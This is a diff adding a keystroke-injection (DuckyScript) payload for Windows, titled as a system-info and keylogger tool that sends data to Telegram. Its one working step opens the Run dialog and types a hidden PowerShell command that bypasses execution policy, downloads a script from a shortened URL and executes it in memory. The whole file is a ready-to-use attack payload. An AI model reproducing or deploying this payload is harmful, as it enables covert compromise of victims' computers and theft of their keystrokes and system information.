@@ -1,0 +1,16 @@
+REM --- Title: System Info & Keylogger ---
+REM Description: Sends system information and keylogs to Telegram via webhooks
+REM Author: k1y0miiii
+REM Target: Windows
+REM DUCKY_LANG US
+
+DEFAULT_DELAY 0
+
+REM --- Step 1: Open Run Dialog ---
+GUI r
+DELAY 100 
+
+REM --- Step 2: Execute PowerShell Command ---
+STRING powershell -WindowStyle Hidden -NoP -NonI -ep Bypass -Command "& { $content = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri 'https://bit.ly/example').Content); Invoke-Expression $content }>$null 2>&1"
+DELAY 20
+ENTER
